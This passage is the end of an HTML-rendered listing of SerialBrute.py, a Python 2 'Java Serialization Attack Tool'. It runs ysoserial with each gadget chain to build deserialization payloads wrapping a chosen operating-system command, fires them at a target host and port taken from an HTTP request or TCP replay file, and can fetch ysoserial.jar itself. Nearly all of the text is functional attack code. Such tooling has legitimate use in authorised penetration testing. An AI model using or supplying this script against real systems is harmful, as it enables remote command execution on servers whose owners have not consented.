style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Get&nbsp;the&nbsp;gadget&nbsp;chain&nbsp;or&nbsp;chains&nbsp;to&nbsp;use&nbsp;in&nbsp;the&nbsp;attack</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;A&nbsp;single&nbsp;gadget&nbsp;may&nbsp;be&nbsp;specified&nbsp;on&nbsp;the&nbsp;command&nbsp;line,&nbsp;in&nbsp;which&nbsp;case&nbsp;use&nbsp;that&nbsp;(provided&nbsp;it's&nbsp;valid).</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;The&nbsp;option&nbsp;to&nbsp;detect&nbsp;gadgets&nbsp;may&nbsp;be&nbsp;specified&nbsp;on&nbsp;the&nbsp;command&nbsp;line,&nbsp;in&nbsp;which&nbsp;case&nbsp;attempt&nbsp;to&nbsp;detect&nbsp;valid&nbsp;gadgets&nbsp;and&nbsp;use&nbsp;those.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;In&nbsp;all&nbsp;other&nbsp;cases,&nbsp;or&nbsp;if&nbsp;detection&nbsp;fails,&nbsp;return&nbsp;all&nbsp;gadget&nbsp;chains.</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;getGadgetChains():<br />	global&nbsp;gadgetChain,&nbsp;detectGadgets,&nbsp;ALL_GADGETS<br />	<br />	<span style="color:#0088ff;font-weight:400">#Gadgets&nbsp;to&nbsp;return</span><br />	retGadgets&nbsp;=&nbsp;[]<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;if&nbsp;a&nbsp;single&nbsp;gadget&nbsp;was&nbsp;specified,&nbsp;and&nbsp;if&nbsp;it's&nbsp;valid</span><br />	if&nbsp;gadgetChain&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;and&nbsp;gadgetChain&nbsp;in&nbsp;ALL_GADGETS:<br />		retGadgets.append(gadgetChain)<br />	else:<br />		<span style="color:#0088ff;font-weight:400">#No&nbsp;single&nbsp;gadget&nbsp;specified,&nbsp;check&nbsp;if&nbsp;detection&nbsp;was&nbsp;requested</span><br />		if&nbsp;detectGadgets&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">True</span>:<br />			<span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;detect&nbsp;available&nbsp;gadgets</span><br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Attempting&nbsp;to&nbsp;detect&nbsp;available&nbsp;POP&nbsp;gadget&nbsp;chains..."</span><br />			retGadgets&nbsp;=&nbsp;doGadgetDetection()<br />			<br />			<span style="color:#0088ff;font-weight:400">#If&nbsp;no&nbsp;gadgets&nbsp;were&nbsp;detected,&nbsp;warn&nbsp;and&nbsp;use&nbsp;all</span><br />			if&nbsp;len(retGadgets)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]&nbsp;Warning,&nbsp;gadget&nbsp;detection&nbsp;did&nbsp;not&nbsp;identify&nbsp;any&nbsp;valid&nbsp;gadget&nbsp;chains"</span><br />				retGadgets&nbsp;=&nbsp;ALL_GADGETS<br />			else:<br />				<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;"</span>&nbsp;+&nbsp;str(len(retGadgets))&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;potential&nbsp;gadget&nbsp;chains&nbsp;identified"</span><br />		else:<br />			<span style="color:#0088ff;font-weight:400">#Use&nbsp;all&nbsp;gadgets</span><br />			retGadgets&nbsp;=&nbsp;ALL_GADGETS<br />	<br />	<span style="color:#0088ff;font-weight:400">#Return&nbsp;the&nbsp;list&nbsp;of&nbsp;gadgets&nbsp;to&nbsp;use</span><br />	return&nbsp;retGadgets<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Check&nbsp;for&nbsp;ysoserial&nbsp;and&nbsp;offer&nbsp;to&nbsp;download&nbsp;it&nbsp;to&nbsp;the&nbsp;current&nbsp;directory&nbsp;if&nbsp;not&nbsp;found.</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;checkForYsoserial():<br />	global&nbsp;YSOSERIAL_PATH,&nbsp;YSOSERIAL_URL<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;if&nbsp;ysoserial&nbsp;exists</span><br />	if&nbsp;not&nbsp;os.path.isfile(YSOSERIAL_PATH):<br />		<span style="color:#0088ff;font-weight:400">#Nope,&nbsp;offer&nbsp;to&nbsp;download&nbsp;it</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Error:&nbsp;The&nbsp;ysoserial&nbsp;JAR&nbsp;file&nbsp;was&nbsp;not&nbsp;found.&nbsp;Edit&nbsp;this&nbsp;script&nbsp;to&nbsp;point"</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;YSOSERIAL_PATH&nbsp;at&nbsp;the&nbsp;correct&nbsp;path,&nbsp;or&nbsp;enter&nbsp;'y'&nbsp;below&nbsp;to&nbsp;download"</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ysoserial.jar&nbsp;to&nbsp;the&nbsp;configured&nbsp;path&nbsp;("</span>&nbsp;+&nbsp;YSOSERIAL_PATH&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">")."</span><br />		if&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"Download&nbsp;ysoserial.jar?&nbsp;"</span>).lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"y"</span>:<br />			<span style="color:#0088ff;font-weight:400">#Download&nbsp;ysoserial</span><br />			urllib.urlretrieve(YSOSERIAL_URL,&nbsp;YSOSERIAL_PATH)<br />		else:<br />			<span style="color:#0088ff;font-weight:400">#Exit,&nbsp;can't&nbsp;operate&nbsp;without&nbsp;ysoserial</span><br />			sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Parse&nbsp;the&nbsp;target&nbsp;host&nbsp;and&nbsp;port&nbsp;from&nbsp;the&nbsp;input&nbsp;file&nbsp;containing&nbsp;a&nbsp;HTTP&nbsp;request</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;parseTargetFromHttpRequest():<br />	global&nbsp;inputFile,&nbsp;targetHost,&nbsp;targetPort<br />	<br />	<span style="color:#0088ff;font-weight:400">#Read&nbsp;the&nbsp;file&nbsp;line-by-line&nbsp;looking&nbsp;for&nbsp;the&nbsp;'Host'&nbsp;header</span><br />	f&nbsp;=&nbsp;open(inputFile)<br />	for&nbsp;line&nbsp;in&nbsp;f:<br />		if&nbsp;line.lower().startswith(<span style="color:#3ad900;font-weight:400">"host:"</span>):<br />			host&nbsp;=&nbsp;line[<span style="color:#ff0044;font-weight:400">5</span>:].strip()<br />			if&nbsp;<span style="color:#3ad900;font-weight:400">":"</span>&nbsp;in&nbsp;host:<br />				targetHost&nbsp;=&nbsp;host.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />				targetPort&nbsp;=&nbsp;int(host.split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])<br />			else:<br />				targetHost&nbsp;=&nbsp;host<br />				targetPort&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br />	f.close()<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Print&nbsp;usage&nbsp;message&nbsp;and&nbsp;quit</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;printUsageAndQuit(err&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>):<br />	<span style="color:#0088ff;font-weight:400">#Print&nbsp;error&nbsp;message&nbsp;if&nbsp;supplied</span><br />	if&nbsp;err&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;err<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#Print&nbsp;usage&nbsp;details</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SerialBrute.py&nbsp;-&nbsp;Java&nbsp;Serialization&nbsp;Attack&nbsp;Tool"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Usage:"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;SerialBrute.py&nbsp;-r&nbsp;&lt;file&gt;&nbsp;-c&nbsp;&lt;command&gt;&nbsp;[opts]"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;SerialBrute.py&nbsp;-p&nbsp;&lt;file&gt;&nbsp;-t&nbsp;&lt;host:port&gt;&nbsp;-c&nbsp;&lt;command&gt;&nbsp;[opts]"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Options:"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-r&nbsp;&lt;file&gt;&nbsp;File&nbsp;containing&nbsp;a&nbsp;HTTP&nbsp;request&nbsp;to&nbsp;issue"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-p&nbsp;&lt;file&gt;&nbsp;File&nbsp;containing&nbsp;TCP&nbsp;packets&nbsp;to&nbsp;replay"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-c&nbsp;&lt;command&gt;&nbsp;The&nbsp;operating&nbsp;system&nbsp;command&nbsp;to&nbsp;use&nbsp;in&nbsp;the&nbsp;attack"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-t&nbsp;&lt;host:port&gt;&nbsp;The&nbsp;target&nbsp;for&nbsp;the&nbsp;attack,&nbsp;required&nbsp;with&nbsp;-p,&nbsp;optional&nbsp;with&nbsp;-r"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-g&nbsp;&lt;gadget&gt;&nbsp;The&nbsp;gadget&nbsp;chain&nbsp;to&nbsp;use&nbsp;(if&nbsp;known,&nbsp;defaults&nbsp;all&nbsp;if&nbsp;not&nbsp;specified)"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-dg&nbsp;Attempt&nbsp;to&nbsp;detect&nbsp;valid&nbsp;gadget&nbsp;chains"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;-n&nbsp;Don't&nbsp;ask&nbsp;for&nbsp;confirmation&nbsp;of&nbsp;success&nbsp;in&nbsp;between&nbsp;attacks"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Input&nbsp;files:"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;HTTP&nbsp;request&nbsp;input&nbsp;files"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;PAYLOAD&nbsp;to&nbsp;mark&nbsp;the&nbsp;location&nbsp;where&nbsp;a&nbsp;payload&nbsp;should&nbsp;be&nbsp;inserted"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;PAYLOADNOHEADER&nbsp;if&nbsp;the&nbsp;serialization&nbsp;header&nbsp;should&nbsp;be&nbsp;stripped"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;TCP&nbsp;replay&nbsp;input&nbsp;files"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;Each&nbsp;line&nbsp;should&nbsp;contain&nbsp;one&nbsp;of&nbsp;the&nbsp;following:"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hex-ascii&nbsp;encoded&nbsp;bytes&nbsp;of&nbsp;a&nbsp;packet&nbsp;to&nbsp;send&nbsp;to&nbsp;the&nbsp;target"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RECV&nbsp;to&nbsp;indicate&nbsp;that&nbsp;a&nbsp;packet&nbsp;should&nbsp;be&nbsp;read&nbsp;from&nbsp;the&nbsp;server"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;PAYLOAD&nbsp;within&nbsp;an&nbsp;outbound&nbsp;packet&nbsp;line,&nbsp;or&nbsp;on&nbsp;a&nbsp;line&nbsp;on&nbsp;its&nbsp;own,&nbsp;to"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;indicate&nbsp;where&nbsp;the&nbsp;payload&nbsp;should&nbsp;be&nbsp;inserted&nbsp;into&nbsp;the&nbsp;packet."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;PAYLOADNOHEADER&nbsp;within&nbsp;an&nbsp;outbound&nbsp;packet&nbsp;line,&nbsp;or&nbsp;on&nbsp;a&nbsp;line&nbsp;on&nbsp;its"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;own,&nbsp;if&nbsp;the&nbsp;serialization&nbsp;header&nbsp;should&nbsp;be&nbsp;stripped&nbsp;before&nbsp;inserting&nbsp;the"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;there."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;E.g."</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aced000577020000"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RECV"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RECV"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PAYLOADNOHEADER"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	<br />	<span style="color:#0088ff;font-weight:400">#Exit</span><br />	if&nbsp;err&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />		sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br />	else:<br />		sys.exit(<span style="color:#ff0044;font-weight:400">0</span>)<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;SerialBrute</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#Process&nbsp;command&nbsp;line&nbsp;args</span><br />sys.argv&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>:]<br />i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />while&nbsp;i&nbsp;&lt;&nbsp;len(sys.argv):<br />	opt&nbsp;=&nbsp;sys.argv[i]<br />	if&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-r"</span>:		<span style="color:#0088ff;font-weight:400">#Filename&nbsp;containing&nbsp;HTTP&nbsp;request</span><br />		attackmode&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http"</span><br />		inputFile&nbsp;=&nbsp;sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />		parseTargetFromHttpRequest()<br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-p"</span>:	<span style="color:#0088ff;font-weight:400">#Filename&nbsp;containing&nbsp;TCP&nbsp;packets&nbsp;to&nbsp;replay</span><br />		attackmode&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"tcpreplay"</span><br />		inputFile&nbsp;=&nbsp;sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-t"</span>:	<span style="color:#0088ff;font-weight:400">#Target&nbsp;(intended&nbsp;for&nbsp;TCP&nbsp;replay&nbsp;mode,&nbsp;but&nbsp;can&nbsp;override&nbsp;HTTP&nbsp;target)</span><br />		targetHost&nbsp;=&nbsp;sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>].split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">0</span>]<br />		targetPort&nbsp;=&nbsp;int(sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>].split(<span style="color:#3ad900;font-weight:400">":"</span>)[<span style="color:#ff0044;font-weight:400">1</span>])<br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-n"</span>:	<span style="color:#0088ff;font-weight:400">#Don't&nbsp;ask&nbsp;for&nbsp;confirmation&nbsp;in&nbsp;between&nbsp;attack&nbsp;attempts</span><br />		confirmAttacks&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-c"</span>:	<span style="color:#0088ff;font-weight:400">#The&nbsp;OS&nbsp;command&nbsp;to&nbsp;attempt&nbsp;to&nbsp;execute</span><br />		cmd&nbsp;=&nbsp;sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-g"</span>:	<span style="color:#0088ff;font-weight:400">#The&nbsp;gadget&nbsp;chain&nbsp;to&nbsp;use</span><br />		gadgetChain&nbsp;=&nbsp;sys.argv[i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>]<br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	elif&nbsp;opt.lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"-dg"</span>:	<span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;detect&nbsp;available&nbsp;gadget&nbsp;chains</span><br />		detectGadgets&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />		i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br />	else:	<span style="color:#0088ff;font-weight:400">#Unknown&nbsp;option</span><br />		printUsageAndQuit(<span style="color:#3ad900;font-weight:400">"Error:&nbsp;Unknown&nbsp;option&nbsp;specified&nbsp;("</span>&nbsp;+&nbsp;opt&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">")"</span>)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Increment&nbsp;i&nbsp;to&nbsp;next&nbsp;parameter</span><br />	i&nbsp;=&nbsp;i&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><br /><span style="color:#0088ff;font-weight:400">#Verify&nbsp;that&nbsp;required&nbsp;runtime&nbsp;options&nbsp;have&nbsp;been&nbsp;set</span><br />if&nbsp;targetHost&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;or&nbsp;targetPort&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>&nbsp;or&nbsp;inputFile&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;or&nbsp;cmd&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;or&nbsp;attackmode&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />	printUsageAndQuit(<span style="color:#3ad900;font-weight:400">"Error:&nbsp;Invalid&nbsp;missing&nbsp;one&nbsp;or&nbsp;more&nbsp;required&nbsp;options:&nbsp;-r,&nbsp;-p,&nbsp;-t,&nbsp;-c"</span>)<br /><br /><span style="color:#0088ff;font-weight:400">#Make&nbsp;sure&nbsp;ysoserial.jar&nbsp;is&nbsp;available,&nbsp;if&nbsp;not&nbsp;offer&nbsp;to&nbsp;download&nbsp;it&nbsp;to&nbsp;the&nbsp;current&nbsp;directory</span><br />checkForYsoserial()<br /><br /><span style="color:#0088ff;font-weight:400">#POP&nbsp;gadget&nbsp;chains&nbsp;to&nbsp;generate</span><br />gadgetChains&nbsp;=&nbsp;getGadgetChains()<br /><br /><span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;attack&nbsp;the&nbsp;server&nbsp;with&nbsp;each&nbsp;available&nbsp;gadget&nbsp;chain</span><br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Starting&nbsp;attack..."</span><br />for&nbsp;g&nbsp;in&nbsp;gadgetChains:<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;Trying&nbsp;POP&nbsp;gadget&nbsp;chain:&nbsp;"</span>&nbsp;+&nbsp;g<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;Generating&nbsp;payload..."</span><br />	with&nbsp;open(os.devnull,&nbsp;<span style="color:#3ad900;font-weight:400">"w"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;FNULL:<br />		payload&nbsp;=&nbsp;subprocess.check_output([<span style="color:#3ad900;font-weight:400">"java"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"-jar"</span>,&nbsp;YSOSERIAL_PATH,&nbsp;g,&nbsp;cmd],&nbsp;stderr=FNULL)<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;Payload&nbsp;generated,&nbsp;launching&nbsp;attack..."</span><br />	launchAttack(payload)<br />	if&nbsp;confirmAttacks:<br />		if&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;Attack&nbsp;successful?&nbsp;(y/n)&nbsp;[n]:&nbsp;"</span>).lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"y"</span>:<br />			break<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br /></div></div></div></body></html>